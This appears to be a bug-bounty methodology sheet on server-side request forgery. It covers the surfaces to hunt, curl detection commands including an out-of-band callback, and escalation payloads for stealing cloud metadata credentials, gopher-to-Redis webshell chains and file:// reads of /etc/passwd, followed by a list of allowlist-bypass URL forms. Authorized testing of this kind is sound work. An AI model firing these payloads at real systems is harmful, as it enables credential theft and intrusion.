# SSRF — Server-Side Request Forgery (deep)

One of the highest-paying classes. Paid patterns (H1): Dropbox *Full-Response SSRF via Google Drive*
**$17,576**; GitLab *SSRF via `remote_attachment_url` on a Note* **$10k**; Dropbox *HelloSign SSRF → AWS
private keys* **$4.9k**; Reddit *blind SSRF in matrix `preview_link` API* **$6k**; TikTok *SSRF + LFR via
FFmpeg HLS video upload* **$2.7k**; GitLab *`http.<url>.*` git-config injection SSRF* **$3k**; Lark
*full-read SSRF via `import as docs`* **$5k**; Kubernetes *half-blind → full SSRF in cloud-controller* **$5k**.

## Where it lives (hunt these surfaces first)
- **URL-fetch features:** webhooks, URL preview/unfurl/link-expand, "import from URL" (docs, images,
  attachments, avatars), RSS/feed readers, SSO metadata fetch, `remote_attachment_url`-style fields.
- **Media/doc processors:** PDF/screenshot generators (headless Chrome/wkhtmltopdf), image libs
  (ImageMagick/libvips), video transcode (FFmpeg HLS/m3u8 external segments), SVG/XML parsers, vCard photo.
- **Integrations:** Jira/GitLab/Slack/CI connectors, git config `http.<url>`, GraphQL resolvers that fetch.
- **Params to fuzz:** `url=,uri=,next=,dest=,redirect=,image=,imageUrl=,callback=,webhook=,feed=,proxy=,
  fetch=,domain=,host=,port=,to=,file=,path=,src=,link=,continue=,data=`.

## Detect
Point every candidate at your OOB listener; watch for DNS **and** HTTP hits (blind) or a reflected body
(full-response). Time-diff reveals blind SSRF behind a silent fetch.
```bash
# collaborator / interactsh — DNS+HTTP proves the server fetched it
curl -s "https://target/api/preview?url=http://<id>.oast.fun/"
# full-response test — does internal content come back in the body?
curl -s "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"
```

## Escalate (blind → impact; this is what pays)
- **Cloud metadata / credential theft:**
  - AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`.
  - **IMDSv2** needs a token: `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`,
    then send the token header — reachable if the SSRF sends full requests (gopher) or arbitrary headers.
  - GCP: `http://metadata.google.internal/computeMetadata/v1/…` + `Metadata-Flavor: Google`.
  - Azure IMDS `+ Metadata:true`; DigitalOcean `169.254.169.254/metadata/v1/`; Alibaba `100.100.100.200`.
- **gopher:// → internal protocol smuggling:** unauth Redis (`SLAVEOF`/`CONFIG SET dir`→webshell/RCE),
  memcached, internal HTTP POST, SMTP (send internal mail). `gopher://127.0.0.1:6379/_<CRLF-payload>`.
- **file:// LFR:** `file:///etc/passwd`, app config, `/proc/self/environ`, cloud creds files.
- **Internal recon:** port-scan `127.0.0.1`/`10.x`/`169.254`, reach `/actuator/env`, admin panels, ES `:9200`.
- **Chain to RCE:** SSRF → internal Jenkins/Kubernetes/Consul/Docker API, or Redis→RCE.

## Filter / parser bypass (when a naive allowlist blocks you)
```
2130706433  017700000001  0x7f000001  127.1  127.0.0.1.nip.io  localtest.me   # loopback forms
[::]  [::1]  [::ffff:169.254.169.254]  0000::1                                # IPv6
http://expected.com@169.254.169.254/  http://169.254.169.254#expected.com     # userinfo/fragment
http://expected.com\@169.254.169.254  http://169.254.169.254%2f%2e%2e         # backslash/encoding
DNS rebinding (rbndr, 1u.ms): A record flips to 169.254.169.254 after the allowlist check
Open-redirect chain: http://allowed.com/redirect?to=http://169.254.169.254/   # filter checks 1st URL only
sslip.io / nip.io wildcard DNS: 169-254-169-254.nip.io
```

## Proof-of-impact bar (else it's N/A — see validation.md)
A DNS ping alone is **rejected**. You must return internal data, leak a credential, or get a response
from an internal service. Full-response SSRF > blind. Cloud-cred theft = Critical (CVSS ~9.1, `S:C`).
